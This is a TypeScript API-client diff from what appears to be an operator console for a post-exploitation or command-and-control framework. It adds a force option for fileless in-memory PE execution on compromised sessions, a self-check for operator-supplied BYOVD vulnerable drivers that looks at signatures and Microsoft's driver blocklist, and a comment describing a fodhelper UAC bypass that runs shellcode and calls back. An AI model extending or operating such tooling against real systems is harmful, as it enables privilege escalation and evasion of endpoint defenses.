@@ -123,8 +123,31 @@ export const sessionApi = {
     arch?: string
     /** exe_mem：等待执行线程结束的毫秒数（0/省略 = 不等待） */
     wait_ms?: number
+    /** 服务端 PE 预检判定为 reject 时，勾选此项强制下发（高危，服务端会记日志留痕） */
+    force?: boolean
   }) =>
-    api.post<{ task_id: number; task_type: string; kind: string; message: string }>(`/sessions/${id}/fileless-exec`, payload),
+    api.post<{
+      task_id: number
+      task_type: string
+      kind: string
+      args?: string
+      message: string
+      /** 预检 warn/reject 降级后的风险提示（任务已下发） */
+      warnings?: string[]
+      /** 处置建议（改用落地执行 / donut / shellcode 等） */
+      suggestion?: string
+      /** 预检结论：ok / warn / reject */
+      preflight_verdict?: string
+      /** 精简 PE 指纹，便于操作员核对 */
+      pe_info?: {
+        machine?: string
+        is_64bit?: boolean
+        is_dll?: boolean
+        has_tls?: boolean
+        has_clr?: boolean
+        is_go?: boolean
+      }
+    }>(`/sessions/${id}/fileless-exec`, payload),
   // UAC 提权：fodhelper 拉起高完整性进程，内存执行 shellcode 回连上线
   privescUAC: (id: string) =>
     api.post<{ task_id: number; task_type: string; message: string }>(`/sessions/${id}/privesc-uac`),
@@ -157,17 +180,42 @@ export interface BuiltinDriver {
   kill_pid_size?: number
   size: number
   sha256: string
-  /** 签名者（人工核对用） */
+  /** 签名者（来自 manifest 的人工标注，字符串；实测结论见 verify.signer） */
   signed?: string
+  /** 加载前自检结论（服务端 WinVerifyTrust + manifest sha256 一致性 + 黑名单策略提示） */
+  verify?: DriverVerifyResult
 }
 
-// 内置 BYOVD 利用驱动（当前内置 kgameprotect.sys，WHQL 签名二进制，嵌在服务端二进制中）
+/** 驱动加载前自检结论（对应服务端 drivers.VerifyResult） */
+export interface DriverVerifyResult {
+  sha256: string
+  manifest_sha256?: string
+  /** manifest 声明了期望哈希时，实际内容是否一致；false = 服务端会拒绝下发 */
+  hash_ok: boolean
+  /** 本机 WinVerifyTrust 是否校验通过 */
+  signed: boolean
+  /** 是否真的做过签名校验（非 Windows 或超时会为 false） */
+  signature_checked: boolean
+  /** 签名者简单显示名（取不到时为空） */
+  signer?: string
+  /** 本机是否启用了微软易受攻击驱动黑名单策略 */
+  blocklisted: boolean
+  blocklist_reason?: string
+  warnings?: string[]
+  errors?: string[]
+  /** 一句话中文结论 */
+  summary?: string
+}
+
+// BYOVD 驱动：由操作员自备（服务端不内置任何驱动），放 drivers/ 或 data/drivers/ + manifest.json
 export const driversApi = {
   list: () => api.get<{ drivers: BuiltinDriver[]; count: number }>('/drivers'),
   raw: async (name: string) => {
     const r = await api.get<ArrayBuffer>(`/drivers/${encodeURIComponent(name)}/raw`, { responseType: 'arraybuffer' })
     return r.data
   },
+  /** 单独查询某个驱动的加载前自检结论 */
+  verify: (name: string) => api.get<DriverVerifyResult & { ok: boolean }>(`/drivers/${encodeURIComponent(name)}/verify`),
 }
 
 // 运行时设置（设置页真实读写，保存后热生效）
